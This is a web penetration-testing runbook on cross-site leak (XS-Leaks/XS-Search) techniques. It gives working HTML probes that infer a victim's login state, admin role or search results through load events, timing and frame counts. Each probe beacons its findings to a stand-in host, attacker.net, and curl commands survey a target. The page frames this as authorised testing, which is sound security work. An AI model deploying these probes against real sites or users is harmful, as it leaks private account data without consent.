---
title: "XS-Search / XS-Leaks"
description: "Cross-site leak primitives that infer private data from timing, errors, frame counts, and cache behavior without reading responses."
phase: Web
order: 81
tags:
  - xs-leaks
  - side-channel
  - cors
  - client-side
tools:
  - browser devtools
  - burp suite
updated: 2026-10-01
---

XS-Leaks turn tiny cross-origin observable differences into data. You never read the response — you infer it from how the browser behaves. This runbook defines the private state to infer, builds minimal probes (event, timing, frame count, cache), accounts for modern defenses, and reproduces the leak with your own accounts — on **in-scope** targets only.

## 1. Define the state and the oracle

Pick what to learn (logged in? has data? role?) and find an observable difference. Compare authenticated vs anonymous responses — a size, status, or timing delta is your signal.

```bash
curl -s -o /dev/null -w "auth code=%{http_code} size=%{size_download}\n" \
  -H "Cookie: session=YOUR_TOKEN" https://target.com/api/me
curl -s -o /dev/null -w "anon code=%{http_code} size=%{size_download}\n" \
  -H "Cookie: session=ANON" https://target.com/api/me
```

## 2. onload / onerror primitive

Detect whether a resource loads by which event fires.

```html
<!-- onload.html: true=loads, false=errors -->
<script>
  var img = new Image();
  img.onload  = () => navigator.sendBeacon("https://attacker.net/c", "TRUE");
  img.onerror = () => navigator.sendBeacon("https://attacker.net/c", "FALSE");
  img.src = "https://target.com/api/me/avatar.png?cb=" + Date.now();
</script>
```

If the avatar only exists for a logged-in user, the event reveals login state.

## 3. Error / status primitive

Different status codes per state can be distinguished by script load vs error.

```html
<!-- error.html: admin-only.js loads only for privileged users -->
<script>
  var s = document.createElement("script");
  s.onload  = () => navigator.sendBeacon("https://attacker.net/c", "ADMIN");
  s.onerror = () => navigator.sendBeacon("https://attacker.net/c", "USER");
  s.src = "https://target.com/api/admin-only.js?cb=" + Date.now();
</script>
```

## 4. Timing and cache probes

Measure load duration where size, compression, or caching differ by state.

```html
<!-- timing.html: average 10 runs, compare auth vs anon -->
<script>
  var i = 0;
  function probe() {
    var t0 = performance.now(), img = new Image();
    img.onload = img.onerror = () => {
      navigator.sendBeacon("https://attacker.net/c", String(Math.round(performance.now() - t0)));
      if (i++ < 10) probe();
    };
    img.src = "https://target.com/search?q=secret&r=" + Math.random();
  }
  probe();
</script>
```

Compare average auth vs anon; check `cache-`/`etag`/`age` headers server-side first.

## 5. Frame counting (XS-Search)

Result pages embedding a variable number of frames leak a boolean.

```html
<!-- frames.html: frame count may reveal a boolean -->
<script>
  var f = document.createElement("iframe");
  f.src = "https://target.com/search?q=secret";
  f.onload = () => {
    try { navigator.sendBeacon("https://attacker.net/c", String(f.contentWindow.length)); }
    catch (e) { navigator.sendBeacon("https://attacker.net/c", "blocked"); }
  };
  document.body.appendChild(f);
</script>
```

## Full pipeline

```bash
# 1. Server-side survey: find a state-dependent difference
for u in https://target.com/api/me https://target.com/search?q=test; do
  for s in "session=YOUR_TOKEN" "session=ANON"; do
    printf "%-16s %-38s " "$s" "$u"
    curl -s -o /dev/null -w "code=%{http_code} size=%{size_download} time=%{time_total}\n" \
      -H "Cookie: $s" "$u"
  done
done
# 2. Check cache headers, then serve probes with your own two accounts
curl -s -i "https://target.com/search?q=secret" | grep -iE "^cache-|^etag|^age"
python3 -m http.server 8000
```

## Ethics & legality

- Test only in-scope properties with accounts and infrastructure you own.
- Send beacons only to your own callback host; never fingerprint real users.
- Repeat and average timing probes to separate signal from noise before claiming a leak.
- Report the responsible mechanism (missing COOP/SameSite/partitioning) with evidence.
